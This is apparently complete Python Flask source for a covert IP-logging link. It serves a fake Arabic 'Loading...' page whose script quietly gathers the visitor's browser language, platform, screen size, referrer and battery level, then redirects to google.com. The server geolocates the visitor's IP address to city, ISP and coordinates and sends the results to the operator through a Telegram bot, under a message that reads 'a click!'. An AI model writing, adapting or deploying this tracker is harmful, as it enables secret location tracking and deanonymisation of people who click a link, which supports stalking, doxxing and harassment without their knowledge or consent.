import os, requests
from datetime import datetime
from flask import Flask, request

app = Flask(__name__)

TOKEN = os.environ.get("BOT_TOKEN")
CHAT  = os.environ.get("CHAT_ID")

PAGE = """<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>Loading...</title></head>
<body style="background:#000;color:#fff;text-align:center;padding-top:100px;font-family:sans-serif">
<h2>جاري التحميل...</h2>
<script>
async function go(){
  let d={lang:navigator.language,plat:navigator.platform,scr:screen.width+"x"+screen.height,ref:document.referrer||"direct"};
  try{let b=await navigator.getBattery();d.bat=Math.round(b.level*100)+"% "+(b.charging?"charging":"not");}catch(e){}
  try{await fetch("/t",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});}catch(e){}
  setTimeout(()=>location.href="https://google.com",1200);
}
go();
</script></body></html>"""

@app.route("/")
def home(): return PAGE

@app.route("/t", methods=["POST"])
def track():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    d = request.get_json(silent=True) or {}
    try:
        g = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon", timeout=6).json()
        loc = f"{g.get('city','?')}, {g.get('country','?')} | ISP: {g.get('isp','?')} | {g.get('lat','?')},{g.get('lon','?')}" if g.get("status")=="success" else "?"
    except: loc = "?"
    msg = (f"🎯 ضغطة!\nIP: {ip}\n📍 {loc}\n💻 {d.get('plat','?')} | {d.get('scr','?')}\n🔋 {d.get('bat','?')}\n🗣 {d.get('lang','?')}\n🔗 {d.get('ref','?')}\n🕒 {datetime.utcnow():%Y-%m-%d %H:%M}")
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id":CHAT,"text":msg}, timeout=6)
    except: pass
    return {"ok":1}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))